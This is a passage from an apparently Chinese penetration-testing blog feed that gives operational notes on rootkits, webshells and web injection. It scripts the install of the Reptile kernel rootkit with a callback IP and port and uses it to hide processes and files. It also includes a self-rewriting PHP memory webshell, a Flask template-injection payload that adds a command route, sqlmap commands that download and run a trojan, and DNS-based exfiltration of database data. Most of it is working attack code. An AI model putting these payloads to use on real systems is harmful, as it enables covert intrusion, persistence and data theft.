class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">centos自动化脚本</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">kernel=`<span class=\"built_in\">uname</span> -r`</span></span><br><span class=\"line\">yum -y install perl vim gcc make g++ unzip</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">由于Cenots内核管理不便，所以使用下载对应版本的kernel-devel到本地</span></span><br><span class=\"line\">yum -y localinstall kernel-devel-&quot;$kernal&quot;.rpm</span><br><span class=\"line\">cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh</span><br><span class=\"line\">./setup.sh install &lt;&lt;EOF</span><br><span class=\"line\">reptile</span><br><span class=\"line\">hax0r</span><br><span class=\"line\">s3cr3t</span><br><span class=\"line\">reptile</span><br><span class=\"line\">666</span><br><span class=\"line\">y</span><br><span class=\"line\">47.94.236.117</span><br><span class=\"line\">4444</span><br><span class=\"line\">1</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">ubuntu自动化脚本</span></span><br><span class=\"line\">apt-get install vim gcc make g++ unzip -y</span><br><span class=\"line\">apt-get -y install linux-headers-$(uname -r)</span><br><span class=\"line\">cd Reptile-2.0/ &amp;&amp; chmod +x ./setup.sh</span><br><span class=\"line\">./setup.sh install &lt;&lt;EOF</span><br><span class=\"line\">reptile</span><br><span class=\"line\">hax0r</span><br><span class=\"line\">s3cr3t</span><br><span class=\"line\">reptile</span><br><span class=\"line\">666</span><br><span class=\"line\">y</span><br><span class=\"line\">47.94.236.117</span><br><span class=\"line\">4444</span><br><span class=\"line\">1</span><br><span class=\"line\">EOF</span><br></pre></td></tr></table></figure>\n<p>使用参考：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2YwcmIxZGQzbi9SZXB0aWxlL3dpa2k=\">https://github.com/f0rb1dd3n/Reptile/wiki</span></p>\n<ul>\n<li>隐藏进程文件连接属性</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">配合msf上线，隐藏msf的进程</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">隐藏进程</span></span><br><span class=\"line\">/reptile/reptile_cmd hide pid</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示进程</span></span><br><span class=\"line\">/reptile/reptile_cmd show pid</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">隐藏连接</span></span><br><span class=\"line\">/reptile/reptile_cmd udp pid port hide</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示连接</span></span><br><span class=\"line\">/reptile/reptile_cmd tcp pid port show</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">隐藏文件 文件名中带reptile的都会被隐藏</span></span><br><span class=\"line\">mkdir reptile_xiaodi</span><br></pre></td></tr></table></figure>\n<ul>\n<li>无须木马通过肉机软件直接控制肉机</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">客户端安装: ./setup.sh client</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">设置连接配置：要填写的信息为在肉机上安装 rookit时填写的目标主机 ip和端口，以及自己为其设置的密码和token值，至于 22 的端口，是伪造的，可以随意填写对方正在运行的端口。</span></span><br><span class=\"line\">set LHOST 47.94.236.117</span><br><span class=\"line\">set LPORT 4444</span><br><span class=\"line\">set SRCHOST 47.94.236.117</span><br><span class=\"line\">set SRCPORT 666</span><br><span class=\"line\">set RHOST 121.43.154.113</span><br><span class=\"line\">set RPORT 22</span><br><span class=\"line\">set PROT TCP</span><br><span class=\"line\">set PASS s3cr3t</span><br><span class=\"line\">set TOKEN hax0r</span><br></pre></td></tr></table></figure>\n<h3 id=\"web内存马\"><a class=\"markdownIt-Anchor\" href=\"#web内存马\">#</a> web 内存马</h3>\n<p>链接:<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2p3ZW55L01lbVNoZWxsRGVtbw==\">https://github.com/jweny/MemShellDemo</span></p>\n<p>Webshell 内存马，是在内存中写入恶意后门和木马并执行，达到远程控制 Web 服务器的一类内存马，其瞄准了企业的对外窗口：网站、应用。但传统的 Webshell 都是基于文件类型的，黑客可以利用上传工具或网站漏洞植入木马， 区别在于 Webshell 内存马是无文件马，利用中间件的进程执行某些恶意代码， 不会有文件落地，给检测带来巨大难度。</p>\n<p>内存 webshell 相比于常规 webshell 更容易躲避传统安全监测设备的检测， 通常被用来做持久化，规避检测，持续驻留目标服务器。无文件攻击、内存 We bshell、进程注入等基于内存的攻击手段也受到了大多数攻击者青睐。</p>\n<h4 id=\"php内存马\"><a class=\"markdownIt-Anchor\" href=\"#php内存马\">#</a> php 内存马</h4>\n<p>set_time_limit () 函数：设置允许脚本运行的时间，单位为秒（如果设置该运行时间，sleep () 函数在执行程序时的持续时间将会被忽略掉）</p>\n<p>ignore_user_abort () 函数：函数设置与客户机断开是否会终止脚本的执行（如果设置为 True，则忽略与用户的断开）</p>\n<p>unlink (FILE) 函数：删除文件（防止文件落地被检测工具查杀）</p>\n<p>file_put_contents 函数：将一个字符串写入该文件中</p>\n<p>usleep 函数：延迟执行当前脚本数微秒，即条件竞争</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">ignore_user_abort(true);</span><br><span class=\"line\">set_time_limit(0);</span><br><span class=\"line\">@unlink(__FILE__);</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">file = <span class=\"string\">&#x27;.HH.php&#x27;</span>;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">code = <span class=\"string\">&#x27;&lt;?php @eval($_POST[\\&#x27;</span>c\\<span class=\"string\">&#x27;]); ?&gt;&#x27;</span>;</span></span><br><span class=\"line\">while (1)&#123;</span><br><span class=\"line\"><span class=\"meta prompt_\">  file_put_contents($</span><span class=\"language-bash\">file,<span class=\"variable\">$code</span>);</span></span><br><span class=\"line\">  usleep(5000);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"py内存马\"><a class=\"markdownIt-Anchor\" href=\"#py内存马\">#</a> py 内存马</h4>\n<p>链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTA5MzM=\">https://xz.aliyun.com/t/10933</span></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">example1</span></span><br><span class=\"line\">http://47.94.236.117:5000/test?param=&#123;&#123;url_for.__globals__[%27__builtins__% 27][%27eval%27](%22app.add_url_rule(%27/shell%27,%20%27shell%27,%20lamb da%20:__import__(%27os%27).popen(_request_ctx_stack.top.request.args.get(%27c md%27,%20%27whoami%27)).read())%22,&#123;%27_request_ctx_stack%27:url_for.__g lobals__[%27_request_ctx_stack%27],%27app%27:url_for.__globals__[%27current_ app%27]&#125;)&#125;&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">example2</span></span><br><span class=\"line\">url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;app.add_url_rule(</span><br><span class=\"line\">&#x27;/shell&#x27;,</span><br><span class=\"line\">&#x27;shell&#x27;,</span><br><span class=\"line\">lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br><span class=\"line\">)&quot;, &#123;</span><br><span class=\"line\">&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;] &#125;</span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n<h4 id=\"java内存马\"><a class=\"markdownIt-Anchor\" href=\"#java内存马\">#</a> java 内存马</h4>\n<p>链接: <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuc2VjcHVsc2UuY29tL2FyY2hpdmVzLzE5MDU0OS5odG1s\">https://www.secpulse.com/archives/190549.html</span></p>\n<p>（ 1 ）按攻击思路，大致分为：<br>\nJava Instrumentation 类（Agent 型）<br>\nServlet-api 类（Servlet 型、Filter 型、Listener 型）<br>\nSpring 类（Controller 型、Interceptor 型）</p>\n<p>（ 2 ）按注入的对象分为：tomcat、weblogic、shiro 等类型。<br>\nServlet-api 类（Servlet 型、Filter 型、Listener 型）<br>\n哥斯拉，冰蝎内存马功能使用</p>\n",
            "tags": [
                "渗透测试"
            ]
        },
        {
            "id": "http://www.n1h1l157.live/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/",
            "url": "http://www.n1h1l157.live/2022/12/30/SAFE/2%20WEB%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E/",
            "title": "XD22 2 Web 通用漏洞",
            "date_published": "2022-12-29T16:00:00.000Z",
            "content_html": "<h3 id=\"sql-注入\"><a class=\"markdownIt-Anchor\" href=\"#sql-注入\">#</a> sql 注入</h3>\n<h4 id=\"sqlmap-测试\"><a class=\"markdownIt-Anchor\" href=\"#sqlmap-测试\">#</a> sqlmap 测试</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">sqlmap 测试是否存在sql注入：</span></span><br><span class=\"line\">sqlmap -r sqlmap.txt --batch --dbs</span><br><span class=\"line\">sqlmap -r sqlmap.txt --batch -D Machine --tables</span><br><span class=\"line\">sqlmap -r sqlmap.txt --batch -D Machine -T login --columns</span><br><span class=\"line\">sqlmap -r sqlmap.txt --batch -D Machine -T login -C username,password,role --dump</span><br><span class=\"line\">sqlmap -r sqlmap.txt --sql-shell</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">是否高权限用户</span></span><br><span class=\"line\">sqlmap -r sqlmap.txt --batch --is-dba </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">清除缓存</span></span><br><span class=\"line\">sqlmap -u (http://127.0.0.1/q.php?id=1 --purge </span><br><span class=\"line\">sqlmap -r sqlmap.txt --file-read &#x27;/var/lib/www/1.php&#x27;</span><br><span class=\"line\">sqlmap -r sqlmap.txt --file-write &#x27;d:/w.txt&#x27; --file-dest &#x27;d:/h.txt&#x27;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">编码注入</span></span><br><span class=\"line\">sqlmap -r sqlmap.txt --batch --tamper=base64encode.py </span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">sqlmap通过注入点下载木马并执行：</span></span><br><span class=\"line\">sqlmap -r sqlmap.txt --os-cmd=&quot;certutil.exe - urlcache - split - f [http://127.0.0.1:81/t.exe](http://127.0.0.1:81/t.exe) d:/e.exe&quot;</span><br><span class=\"line\">sqlmap -r sqlmap.txt --os-cmd=&quot;d:/e.exe&quot;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">弹出系统命令对话框但是执行速度会非常慢</span></span><br><span class=\"line\">sqlmap -r sqlmap.txt --os-shell </span><br></pre></td></tr></table></figure>\n<p>++ 数据包中如果某参数后有’*' 号表示从此注入，否则全部尝试注入，可以放在 X-Forawad-for 后等</p>\n<h4 id=\"手工-sql-注入\"><a class=\"markdownIt-Anchor\" href=\"#手工-sql-注入\">#</a> 手工 sql 注入</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">对 history.php 所在的 url 地址尝试手工判断是否是注入点</span></span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin%27%20and%201=1--+</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">猜字段有多少个， 1 时是正确的， 1 、 2 时报错了，说明只能爆出来一个字段</span></span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin%27%20union%20select%201--+</span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin%27%20union%20select%201,2--+</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">爆出数据库的名字，当前数据库名显示为数据库名是 <span class=\"built_in\">users</span></span></span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin\\&#x27; union select database()--+</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示有四个数据库 information_schema,mysql,performance_schema,sys,<span class=\"built_in\">users</span></span></span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(schema_name)%20from%20information_schema.schemata--+</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示数据库 <span class=\"built_in\">users</span> 下有两个表: details,<span class=\"built_in\">log</span></span></span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27users%27--+group_concat(table_name) from information_schema.tables where table_schema=&#x27;users&#x27;--+</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示数据库<span class=\"built_in\">users</span>中表detail 有两列:name，password</span></span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27details%27--+group_concat(column_name) from information_schema.columns where table_name=&#x27;details&#x27;--+</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">显示users.detail 中 name 分别是:admin,admin123,john,<span class=\"built_in\">test</span></span></span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(name)%20from%20users.details--+group_concat(name) from users.details--+</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">得到 users.detail 中 password 的值:</span></span><br><span class=\"line\">http://192.168.31.208/history.php?user=admin%27%20union%20select%20group_concat(password)%20from%20users.details--+group_concat(password) from users.details--+</span><br></pre></td></tr></table></figure>\n<h4 id=\"sql-三大盲注\"><a class=\"markdownIt-Anchor\" href=\"#sql-三大盲注\">#</a> sql 三大盲注</h4>\n<p>盲注就是在注入过程中，获取的数据不能回显至前端页面。此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">布尔盲注：有数据库输出判断标准</span></span><br><span class=\"line\">left(database(),1)&gt;&#x27;s&#x27;</span><br><span class=\"line\">select user() regexp&#x27;^r&#x27;</span><br><span class=\"line\">select user() like&#x27;^ro%&#x27;</span><br><span class=\"line\">ascii(substr((select database()),1,1))&lt;&gt;</span><br><span class=\"line\">ord(mid((select user()),1,1))=</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">报错注入：有数据库报错处理判断标准</span></span><br><span class=\"line\">floor(rand(0)*2))</span><br><span class=\"line\">extractvalue(1,concat(0x7e,(select user()),0x7e));</span><br><span class=\"line\">select updatexml(1,concat(0x7e,(select user()),0x7e),1);</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">时间盲注：都不需要，比较好用</span></span><br><span class=\"line\">if(left(user(),1)=&#x27;a&#x27;,0,sleep(3));</span><br></pre></td></tr></table></figure>\n<ul>\n<li>盲注中的相关函数的解释</li>\n</ul>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">like &#x27;ro%&#x27; #判断ro或ro...是否成立</span><br><span class=\"line\">regexp &#x27;^xiaodi[a-z]&#x27; #匹配xiaodi及xiaodi...等</span><br><span class=\"line\">if (条件,5,0) #条件成立 返回 5 反之 返回 0</span><br><span class=\"line\">sleep(5) #SQL语句延时执行 5 秒</span><br><span class=\"line\">mid(a,b,c) #从位置b开始，截取a字符串的c位</span><br><span class=\"line\">substr(a,b,c) #从位置b开始，截取字符串a的c长度</span><br><span class=\"line\">left(database(),1)，database() #left(a,b)从左侧截取a的前b位</span><br><span class=\"line\">length(database())=8 #判断数据库database()名的长度</span><br><span class=\"line\">ord=ascii ascii(x)=97 #判断x的ascii码是否等于 97</span><br></pre></td></tr></table></figure>\n<ul>\n<li>盲注漏洞寻找：特定函数 + 功能点<br>\n insert/update/delete 无回显，手工测功能点（会员中心 / 删除新闻 / 修改文章 / 留言），注意闭合前面和后面的部分，构造 payload，找到注入点配合工具脚本。代码会带入到数据库中执行，仅保证数据能够执行但没有回显，需要用盲注的方式爆出数据库数据。</li>\n</ul>\n<h4 id=\"宽字节注入\"><a class=\"markdownIt-Anchor\" href=\"#宽字节注入\">#</a> 宽字节注入</h4>\n<p>自动加上一个转义符号，会导致注入语句失效，使用宽字节绕过。</p>\n<p>在计算机中每一个字符为 8 位，那么就是 1 个字节，宽字节注入就是两个字节合并从而进行绕过，如 <span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS93aGVyZS5waHA/aWQ9MQ==\">http://127.0.0.1/where.php?id=1</span>’ 当我们输入单引号的时候，那么会被转义成’，这样就无法进行注入。</p>\n<p>但是进行绕过的话，在 id 参数加入一个 % df 被转义后成为 % df%5c 那么就会成为一个繁体字。<span class=\"exturl\" data-url=\"aHR0cDovLzEyNy4wLjAuMS93aGVyZS5waHA/aWQ9JWRm\">http://127.0.0.1/where.php?id=�</span>’ (運’) 这样会被转义，但是这是宽字节，所以即使被转义后也可以进行注入。之后就用 sqlmap 跑即可。</p>\n<h4 id=\"堆叠注入\"><a class=\"markdownIt-Anchor\" href=\"#堆叠注入\">#</a> 堆叠注入</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将一堆sql语句叠加后执行，用分号结束上一个语句再叠加其他语句一起执行。在数据库中可以用拼接的语句来实现效果：</span></span><br><span class=\"line\">select * from users where id=1;create table test like users;</span><br><span class=\"line\">select * from users where id=1;drop table test;</span><br><span class=\"line\">select * from users where id=1;select 1,2,3;</span><br><span class=\"line\">select * from users where id=1;insert into users(id,username,password) values (&#x27;100&#x27;,&#x27;new&#x27;,&#x27;new&#x27;);</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果selcet/insert/update/delete被过滤，可以采用编码的方式绕过：</span></span><br><span class=\"line\">PREPARE yuchuli from &#x27;select * from `1919810931114514`&#x27;; EXECUTE yuchuli;</span><br><span class=\"line\">&#x27;;SET @sql = concat(char(115,101,108,101,99,116), &quot; * from `1919810931114514`&quot;); PREPARE yuchuli from @sql; EXECUTE yuchuli;</span><br><span class=\"line\">&#x27;;SET @a=0x73656c656374202a2066726f6d20603139313938313039333131313435313460;PREPARE execsql from @a;EXECUTE execsql;</span><br></pre></td></tr></table></figure>\n<h4 id=\"二次注入\"><a class=\"markdownIt-Anchor\" href=\"#二次注入\">#</a> 二次注入</h4>\n<p>进行数据库插入数据时，对其中的特殊字符进行了转义处理，在写入数据库的时候又保留了原来的数据。开发者默认存入数据库的数据都是安全的，在进行查询时，直接从数据库中取出恶意数据，没有进行进一步的检验的处理。</p>\n<p><strong>可以在注册处注册一个恶意数据</strong></p>\n<p><strong>注册一个 admin’# 的账号，登陆该账号后可以进行密码修改。当数据写入到数据库的时候反斜杠会被移除，所以写入到数据库的内容就是原始数据，并不会在前面多了反 斜杠。用 admin’# 登陆，并进行密码修改，密码修改为 123456。</strong></p>\n<p><strong>此时原来 admin 的密码被改变为 123456。因为我们将问题数据存储到了数据库，而程序再取数据库中的数据时没有进行二次判断便直接带入到代码中，从而造成了二次注 入。</strong></p>\n<h4 id=\"dnslog注入\"><a class=\"markdownIt-Anchor\" href=\"#dnslog注入\">#</a> dnslog 注入</h4>\n<p>域名可以分为 5 级，从右向左解析，用’.' 分割级别，低级别的域名要在高级别的域名中去解析，所以当 <span class=\"exturl\" data-url=\"aHR0cDovL3NlY3VyaXR5LmdpdHc3Yy5kbnNsb2cuY24=\">security.gitw7c.dnslog.cn</span> 去 <span class=\"exturl\" data-url=\"aHR0cDovL2dpdHc3Yy5kbnNsb2cuY24=\">gitw7c.dnslog.cn</span> 中去解 析的时候，就会留下解析记录，通过获取前来解析的低级域名前缀来获取我们需要的信息。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">dnslog 注入使用</span></span><br><span class=\"line\">select load_file(concat(&#x27;\\\\\\\\&#x27;,(select database()),&#x27;.gitw7c.dnslog.cn/abc&#x27;));</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">//转换之后的结果为:\\\\security.gitw7c.dnslog.cn</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">load_file请求security.gitw7c.dnslog.cn下的/abc文件时留下dns解析记录来获取信息的。</span></span><br></pre></td></tr></table></figure>\n<ul>\n<li>域名解析规则与 mysql 解析 url 的问题</li>\n</ul>\n<p>域名里有一个规则，只能出现数字，字母，下划线；所以在获取到的信息中包含了其<br>\n他特殊符号时，load_file 就会认为是一个错误的域名，就不会去从网络中解析了。当数据 库名为 security，以字母开头，在域名规则内是允许的，load_file 会向域名进行解析。而当 在域名中拼接一个 @符号时，就不会进行解析。</p>\n<p>在使用 group_concat 合并查询时，会自动使用’,‘连接我们查询到的每值，但是由于’,’ 在 url 中是不允许出现的，所以使用 group 查询到的值去解析时候，mysql 就会认为这不是一 个 url 地址，就不会出现解析的操作，所以就没法获取到值。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用replace，substr等函数，可以绕过url解析的问题。如：</span></span><br><span class=\"line\">select load_file(concat(&#x27;\\\\\\\\&#x27;,(select SUBSTR(replace((group_concat(username )),&#x27;,&#x27;,&#x27;_&#x27;),1,63) from users),&#x27;.qnpqsu.dnslog.cn/abc&#x27;))</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过正则替换将replace中的<span class=\"string\">&quot;,&quot;</span>全部替换为<span class=\"string\">&quot;_&quot;</span>后符合了url的解析规则，并且需要将查询结果的字符长度控制在 63 个之内。</span></span><br></pre></td></tr></table></figure>\n<p><strong>dnslog 还可以解决命令注入无回显的问题，在有命令执行的地方尝试执行命令：curl 得到的 dnslog 子域名，如果执行成功则在 dnslog.cn 上会有回显。dns 协议一般不会被禁用或被防火墙拦截，是可以出网的。</strong></p>\n<h3 id=\"文件上传\"><a class=\"markdownIt-Anchor\" href=\"#文件上传\">#</a> 文件上传</h3>\n<h4 id=\"常见绕过方法\"><a class=\"markdownIt-Anchor\" href=\"#常见绕过方法\">#</a> 常见绕过方法</h4>\n<ul>\n<li>前端 js 认证：可修改数据包将 jpg/png 改为 php</li>\n<li>MIME 绕过：抓包修改 content-type 为图片类型 image/jpeg、image/png、image/gif</li>\n<li>点 + 空格 + 点 / 大小写 / 空格绕过：伪造为’1.php. .' 或’1.pHP’或’1.php ’</li>\n<li>文件头部信息绕过：不同格式后缀的图片用编辑器打开之后头几个字母不同，通过伪造</li>\n<li>文件的头部信息绕过文件类型校验，如 gif 的头部是 